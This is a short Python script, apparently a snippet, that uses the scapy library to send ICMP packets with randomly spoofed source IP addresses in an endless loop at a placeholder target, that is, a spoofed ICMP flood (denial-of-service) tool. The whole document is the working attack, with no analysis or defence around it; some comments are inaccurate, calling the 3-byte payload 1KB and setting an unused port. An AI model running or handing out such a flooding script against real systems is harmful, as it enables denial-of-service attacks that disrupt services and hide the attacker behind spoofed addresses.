from scapy.all import *

target_ip="e.f.g.h"
target_port=80

ip=IP(src=RandIP(), dst=target_ip) #for spoofing sender's IP
icmp=ICMP()

raw=Raw(load="abc") #raw file of size 1KB to be flooded

p=ip/icmp/raw #creating packet p

send(p, loop=1, verbose=0) #loop=1 defines while(loop==1) until Ctrl+C;  verbose=0 will help in not print anything during the process

